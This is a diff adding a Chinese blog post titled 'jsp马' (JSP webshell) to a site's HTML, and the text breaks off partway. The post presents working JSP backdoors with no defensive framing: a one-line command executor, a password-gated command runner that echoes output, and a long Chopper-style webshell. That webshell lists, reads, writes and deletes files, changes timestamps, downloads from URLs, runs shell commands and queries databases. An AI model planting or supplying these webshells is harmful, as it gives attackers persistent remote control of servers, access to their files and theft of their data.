@@ -210,6 +210,321 @@ var _hmt = _hmt || [];
             
 
   
+    <article id="post-jsp马" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2021/03/06/jsp%E9%A9%AC/">jsp马</a>
+	
+    </h1>
+  
+
+
+  
+  
+<a href="/2021/03/06/jsp%E9%A9%AC/" class="archive-article-date">
+        <time datetime="2021-03-06T06:49:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-06</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="无回显执行命令"><a href="#无回显执行命令" class="headerlink" title="无回显执行命令"></a>无回显执行命令</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>));%&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="有回显带密码执行命令"><a href="#有回显带密码执行命令" class="headerlink" title="有回显带密码执行命令"></a>有回显带密码执行命令</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;b&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>pwd为密码参数名，密码为b，i为命令执行参数</p>
+<h2 id="jsp一句话木马"><a href="#jsp一句话木马" class="headerlink" title="jsp一句话木马"></a>jsp一句话木马</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;</span>%&gt;</span><br><span class="line">&lt;%!String Pwd = <span class="string">&quot;pass&quot;</span>;     <span class="comment">//菜刀连接密码</span></span><br><span class="line"> </span><br><span class="line">    <span class="function">String <span class="title">EC</span><span class="params">(String s, String c)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;<span class="comment">//new String(s.getBytes(&quot;ISO-8859-1&quot;),c);&#125;</span></span><br><span class="line"> </span><br><span class="line">    <span class="function">Connection <span class="title">GC</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String[] x = s.trim().split(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        Class.forName(x[<span class="number">0</span>].trim()).newInstance();</span><br><span class="line">        Connection c = DriverManager.getConnection(x[<span class="number">1</span>].trim());</span><br><span class="line">        <span class="keyword">if</span> (x.length &gt; <span class="number">2</span>) &#123;</span><br><span class="line">            c.setCatalog(x[<span class="number">2</span>].trim());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">AA</span><span class="params">(StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File r[] = File.listRoots();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r.length; i++) &#123;</span><br><span class="line">            sb.append(r[i].toString().substring(<span class="number">0</span>, <span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">BB</span><span class="params">(String s, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File oF = <span class="keyword">new</span> File(s), l[] = oF.listFiles();</span><br><span class="line">        String sT, sQ, sF = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        java.util.Date dt;</span><br><span class="line">        SimpleDateFormat fm = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; l.length; i++) &#123;</span><br><span class="line">            dt = <span class="keyword">new</span> java.util.Date(l[i].lastModified());</span><br><span class="line">            sT = fm.format(dt);</span><br><span class="line">            sQ = l[i].canRead() ? <span class="string">&quot;R&quot;</span> : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            sQ += l[i].canWrite() ? <span class="string">&quot; W&quot;</span> : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (l[i].isDirectory()) &#123;</span><br><span class="line">                sb.append(l[i].getName() + <span class="string">&quot;/\t&quot;</span> + sT + <span class="string">&quot;\t&quot;</span> + l[i].length()</span><br><span class="line">                        + <span class="string">&quot;\t&quot;</span> + sQ + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sF += l[i].getName() + <span class="string">&quot;\t&quot;</span> + sT + <span class="string">&quot;\t&quot;</span> + l[i].length() + <span class="string">&quot;\t&quot;</span></span><br><span class="line">                        + sQ + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sb.append(sF);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">EE</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(s);</span><br><span class="line">        <span class="keyword">if</span> (f.isDirectory()) &#123;</span><br><span class="line">            File x[] = f.listFiles();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; x.length; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!x[k].delete()) &#123;</span><br><span class="line">                    EE(x[k].getPath());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.delete();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">FF</span><span class="params">(String s, HttpServletResponse r)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span><br><span class="line">        r.reset();</span><br><span class="line">        ServletOutputStream os = r.getOutputStream();</span><br><span class="line">        BufferedInputStream is = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(s));</span><br><span class="line">        os.write((<span class="string">&quot;-&gt;&quot;</span> + <span class="string">&quot;|&quot;</span>).getBytes(), <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="keyword">while</span> ((n = is.read(b, <span class="number">0</span>, <span class="number">512</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(b, <span class="number">0</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">        os.write((<span class="string">&quot;|&quot;</span> + <span class="string">&quot;&lt;-&quot;</span>).getBytes(), <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">        os.close();</span><br><span class="line">        is.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">GG</span><span class="params">(String s, String d)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String h = <span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        File f = <span class="keyword">new</span> File(s);</span><br><span class="line">        f.createNewFile();</span><br><span class="line">        FileOutputStream os = <span class="keyword">new</span> FileOutputStream(f);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; d.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">            os</span><br><span class="line">                    .write((h.indexOf(d.charAt(i)) &lt;&lt; <span class="number">4</span> | h.indexOf(d</span><br><span class="line">                            .charAt(i + <span class="number">1</span>))));</span><br><span class="line">        &#125;</span><br><span class="line">        os.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">HH</span><span class="params">(String s, String d)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File sf = <span class="keyword">new</span> File(s), df = <span class="keyword">new</span> File(d);</span><br><span class="line">        <span class="keyword">if</span> (sf.isDirectory()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!df.exists()) &#123;</span><br><span class="line">                df.mkdir();</span><br><span class="line">            &#125;</span><br><span class="line">            File z[] = sf.listFiles();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; z.length; j++) &#123;</span><br><span class="line">                HH(s + <span class="string">&quot;/&quot;</span> + z[j].getName(), d + <span class="string">&quot;/&quot;</span> + z[j].getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            FileInputStream is = <span class="keyword">new</span> FileInputStream(sf);</span><br><span class="line">            FileOutputStream os = <span class="keyword">new</span> FileOutputStream(df);</span><br><span class="line">            <span class="keyword">int</span> n;</span><br><span class="line">            <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span><br><span class="line">            <span class="keyword">while</span> ((n = is.read(b, <span class="number">0</span>, <span class="number">512</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                os.write(b, <span class="number">0</span>, n);</span><br><span class="line">            &#125;</span><br><span class="line">            is.close();</span><br><span class="line">            os.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">II</span><span class="params">(String s, String d)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File sf = <span class="keyword">new</span> File(s), df = <span class="keyword">new</span> File(d);</span><br><span class="line">        sf.renameTo(df);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">JJ</span><span class="params">(String s)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(s);</span><br><span class="line">        f.mkdir();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">KK</span><span class="params">(String s, String t)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(s);</span><br><span class="line">        SimpleDateFormat fm = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">        java.util.Date dt = fm.parse(t);</span><br><span class="line">        f.setLastModified(dt.getTime());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">LL</span><span class="params">(String s, String d)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URL u = <span class="keyword">new</span> URL(s);</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        FileOutputStream os = <span class="keyword">new</span> FileOutputStream(d);</span><br><span class="line">        HttpURLConnection h = (HttpURLConnection) u.openConnection();</span><br><span class="line">        InputStream is = h.getInputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">512</span>];</span><br><span class="line">        <span class="keyword">while</span> ((n = is.read(b, <span class="number">0</span>, <span class="number">512</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(b, <span class="number">0</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">        os.close();</span><br><span class="line">        is.close();</span><br><span class="line">        h.disconnect();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">MM</span><span class="params">(InputStream is, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String l;</span><br><span class="line">        BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line">        <span class="keyword">while</span> ((l = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            sb.append(l + <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">NN</span><span class="params">(String s, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        ResultSet r = c.getMetaData().getCatalogs();</span><br><span class="line">        <span class="keyword">while</span> (r.next()) &#123;</span><br><span class="line">            sb.append(r.getString(<span class="number">1</span>) + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">OO</span><span class="params">(String s, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        String[] t = &#123; <span class="string">&quot;TABLE&quot;</span> &#125;;</span><br><span class="line">        ResultSet r = c.getMetaData().getTables(<span class="keyword">null</span>, <span class="keyword">null</span>, <span class="string">&quot;%&quot;</span>, t);</span><br><span class="line">        <span class="keyword">while</span> (r.next()) &#123;</span><br><span class="line">            sb.append(r.getString(<span class="string">&quot;TABLE_NAME&quot;</span>) + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PP</span><span class="params">(String s, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String[] x = s.trim().split(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(<span class="number">1005</span>, <span class="number">1007</span>);</span><br><span class="line">        ResultSet r = m.executeQuery(<span class="string">&quot;select * from &quot;</span> + x[<span class="number">3</span>]);</span><br><span class="line">        ResultSetMetaData d = r.getMetaData();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= d.getColumnCount(); i++) &#123;</span><br><span class="line">            sb.append(d.getColumnName(i) + <span class="string">&quot; (&quot;</span> + d.getColumnTypeName(i)</span><br><span class="line">                    + <span class="string">&quot;)\t&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        r.close();</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">QQ</span><span class="params">(String cs, String s, String q, StringBuffer sb)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        Connection c = GC(s);</span><br><span class="line">        Statement m = c.createStatement(<span class="number">1005</span>, <span class="number">1008</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ResultSet r = m.executeQuery(q);</span><br><span class="line">            ResultSetMetaData d = r.getMetaData();</span><br><span class="line">            <span class="keyword">int</span> n = d.getColumnCount();</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">                sb.append(d.getColumnName(i) + <span class="string">&quot;\t|\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (r.next()) &#123;</span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">                    sb.append(EC(r.getString(i), cs) + <span class="string">&quot;\t|\t&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                sb.append(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            r.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            sb.append(<span class="string">&quot;Result\t|\t\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                m.executeUpdate(q);</span><br><span class="line">                sb.append(<span class="string">&quot;Execute Successfully!\t|\t\r\n&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ee) &#123;</span><br><span class="line">                sb.append(ee.toString() + <span class="string">&quot;\t|\t\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        m.close();</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;%&gt;    </span><br><span class="line">&lt;%</span><br><span class="line">    String cs = request.getParameter(<span class="string">&quot;z0&quot;</span>)==<span class="keyword">null</span>?<span class="string">&quot;gbk&quot;</span>: request.getParameter(<span class="string">&quot;z0&quot;</span>) + <span class="string">&quot;&quot;</span>;</span><br><span class="line">    request.setCharacterEncoding(cs);</span><br><span class="line">    response.setContentType(<span class="string">&quot;text/html;charset=&quot;</span> + cs);</span><br><span class="line">    String Z = EC(request.getParameter(Pwd) + <span class="string">&quot;&quot;</span>, cs);</span><br><span class="line">    String z1 = EC(request.getParameter(<span class="string">&quot;z1&quot;</span>) + <span class="string">&quot;&quot;</span>, cs);</span><br><span class="line">    String z2 = EC(request.getParameter(<span class="string">&quot;z2&quot;</span>) + <span class="string">&quot;&quot;</span>, cs);</span><br><span class="line">    StringBuffer sb = <span class="keyword">new</span> StringBuffer(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        sb.append(<span class="string">&quot;-&gt;&quot;</span> + <span class="string">&quot;|&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Z.equals(<span class="string">&quot;A&quot;</span>)) &#123;</span><br><span class="line">            String s = <span class="keyword">new</span> File(application.getRealPath(request</span><br><span class="line">                    .getRequestURI())).getParent();</span><br><span class="line">            sb.append(s + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!s.substring(<span class="number">0</span>, <span class="number">1</span>).equals(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">                AA(sb);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;B&quot;</span>)) &#123;</span><br><span class="line">            BB(z1, sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;C&quot;</span>)) &#123;</span><br><span class="line">            String l = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(</span><br><span class="line">                    <span class="keyword">new</span> InputStreamReader(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(</span><br><span class="line">                            z1))));</span><br><span class="line">            <span class="keyword">while</span> ((l = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                sb.append(l + <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            br.close();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;D&quot;</span>)) &#123;</span><br><span class="line">            BufferedWriter bw = <span class="keyword">new</span> BufferedWriter(</span><br><span class="line">                    <span class="keyword">new</span> OutputStreamWriter(<span class="keyword">new</span> FileOutputStream(</span><br><span class="line">                            <span class="keyword">new</span> File(z1))));</span><br><span class="line">            bw.write(z2);</span><br><span class="line">            bw.close();</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;E&quot;</span>)) &#123;</span><br><span class="line">            EE(z1);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;F&quot;</span>)) &#123;</span><br><span class="line">            FF(z1, response);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;G&quot;</span>)) &#123;</span><br><span class="line">            GG(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;H&quot;</span>)) &#123;</span><br><span class="line">            HH(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;I&quot;</span>)) &#123;</span><br><span class="line">            II(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;J&quot;</span>)) &#123;</span><br><span class="line">            JJ(z1);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;K&quot;</span>)) &#123;</span><br><span class="line">            KK(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;L&quot;</span>)) &#123;</span><br><span class="line">            LL(z1, z2);</span><br><span class="line">            sb.append(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;M&quot;</span>)) &#123;</span><br><span class="line">            String[] c = &#123; z1.substring(<span class="number">2</span>), z1.substring(<span class="number">0</span>, <span class="number">2</span>), z2 &#125;;</span><br><span class="line">            Process p = Runtime.getRuntime().exec(c);</span><br><span class="line">            MM(p.getInputStream(), sb);</span><br><span class="line">            MM(p.getErrorStream(), sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;N&quot;</span>)) &#123;</span><br><span class="line">            NN(z1, sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Z.equals(<span class="string">&quot;O&quot;</span>)) &#123;</span><br><span class="line">            OO(z1, sb);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> 